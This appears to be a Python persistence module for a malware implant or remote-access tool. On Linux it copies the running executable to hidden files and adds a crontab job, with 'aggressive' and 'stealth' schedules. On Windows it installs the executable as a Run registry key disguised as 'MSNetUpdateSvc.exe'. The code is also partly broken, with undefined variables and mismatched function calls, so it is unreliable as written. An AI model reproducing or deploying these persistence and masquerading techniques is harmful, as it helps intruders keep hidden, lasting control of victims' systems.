
import os
import sys
import getpass
import stat
import argparse

from shutil import copyfile

def parse_args(self, args):

    #Initial argument setup
    show = None
    settings = {}

    #Get (any) raw args
    if args:
        args = args.split(' ')
        for arg in args:
            if arg == '--show' or arg == '-s':
                show = True

    #rationalise and test arguments into settings dict
    if show:
        print("DEBUG - agent {} showing screenshot.".format(self.name))
        return None
    elif (not aggressive and not stealth) or aggressive:
        settings['style'] = 'aggressive'
    else:
        settings['style'] = 'stealth'

    if pers_meth:
        settings['method'] = pers_meth
    else:
        settings['method'] = 'default'

    print("Debug - args: {}".format(settings))
    return settings

def windows_persist(dropper, settings):
    print("DEBUG - Windows persisting")
    #Actually persist
    if settings['method'] == "run_key" or settings['method'] == "default":
        success, message = add_run_key(dropper)
    else:
        message = "Invalid method : {}".format(settings['method'])
        success = False

    #Check success
    if success:
        dropper.resp = "{} successfully persisted via {}\n{}.".format(
                dropper.name, settings['method'], message)
    else:
        dropper.resp = message


def linux_persist(dropper, settings):
    print("DEBUG - Linux persisting")
    #Actually persist
    if settings['method'] == "cron" or settings['method'] == "default":
        success, message = add_cron(dropper, settings['style'])
    else:
        message = "Invalid method : {}".format(settings['method'])
        success = False

    #Check success
    if success:
        dropper.resp = "{} successfully persisted via {}\n{}".format(
                dropper.name, settings['method'], message)
    else:
        dropper.resp = message


def osx_persist(dropper):
    print("TODO - persist Mac style!")
    dropper.resp = "TODO - presist OSX style."

def add_cron(dropper, mode='aggressive'):
    #Setup info
    cron_dir = '/var/spool/cron/'
    file_name = sys.executable
    user = getpass.getuser()
    short_file_name = '.' + file_name.split('/')[-1:][0] #make the file hidden because why not
    destinations = ['/usr/local/bin/' , '/bin/', '/home/' + user + '/', '/tmp/']

    #Cron triggers and setup
    aggressive = "* * * * * {}"         #Every minute try and run
    sneaky = "*/5 9-17 * * MON-FRI {}"   #Try every 5 mins during working hours
    #Actual job to run
    job = "if [ $(ps aux | grep {} | grep -v grep | wc -l) -le 1 ]"
    job += " ; then {} > /dev/null 2>&1; fi \n"

    #setup job syntax
    if mode == 'aggressive':
        cron_line = aggressive.format(job)
    elif mode == "stealth":
        cron_line = sneaky.format(job)
    else:
        #There's been a big error, send back custom message and return False
        return False, "ERROR - invalid cron trigger mode : {}".format(str(mode))

    #Copy file to run location
    pers_file = None
    for dest in destinations:
        dest = dest + short_file_name
        try:
            if os.path.exists(dest):
                pers_file = dest
                print("DEBUG - File {} already exists. Using.".format(dest))
                break
            else:
                copyfile(file_name, dest)
                print("DEBUG - Copied {} to {}".format(file_name, dest))
                st = os.stat(dest)
                os.chmod(dest, st.st_mode | stat.S_IEXEC)
                print("DEBUG - Set executable from {}".format(st))
                pers_file = dest
                break
        except Exception as e:
            print("ERROR - Couldn't write to {} beause : {} ".format(dest, e))
    if not pers_file:
        print("Fatal - couldn't persist")
        dropper.resp = "ERROR - Failed to persist in linux"

    #Here's the crontab line we'll be adding now:
    cron_line = cron_line.format(short_file_name[1:], pers_file)    #strip dot from grep commands

    #Before we start, check we're not already persistent
    with open(cron_dir + user, 'r') as f:
        if cron_line in f.read():
            return False, "Already persistent - Crontab entry already present :\n{}".format(
                    cron_line)

    #Now we have the filenames etc. write out the cron configuration
    if not os.path.exists(cron_dir):
        os.makedirs(cron_dir)
    with open(cron_dir + user, 'a') as f:
        f.write(cron_line)
    print("DEBUG - Added to cron: \n{}".format(cron_line))
    return True, "Added cron config : {}".format(cron_line)

def add_run_key(dropper):
    try:
        #Let's break the import rules, BECAUSE we want to be cross-platform
        import winreg
        #Get info about executable
        file_name = sys.executable
        #Now pick a destination
        app_data = os.getenv('APPDATA')
        dest = app_data.strip('\n\r') + '\\Microsoft\\' + 'MSNetUpdateSvc.exe'
        #Put the executable in the right place
        if not os.path.exists(dest):
            copyfile(file_name, dest)
        #Add the registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,\
                "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, 'NetworkUpdateSvc', 0, winreg.REG_SZ, dest)
        key.Close()
        return True, "{} successfully persisted!".format(dropper.name)
    except Exception as e:
        return False, "ERROR - Failed to persist in Windows : {}".format(e)


def main(dropper, args=None):
    settings = parse_args(args)
    if not settings:
        dropper.resp = "ERROR parsing args : {}".format(settings)
        return

    if sys.platform == "linux" or sys.platform == "linux2":
        linux_persist(dropper, settings)
    elif sys.platform == "darwin":
        osx_persist(dropper, settings)
    elif sys.platform == "win32":
        windows_persist(dropper, settings)
    else:
        dropper.resp = "ERROR - Platform  {} not found.".format(platform)
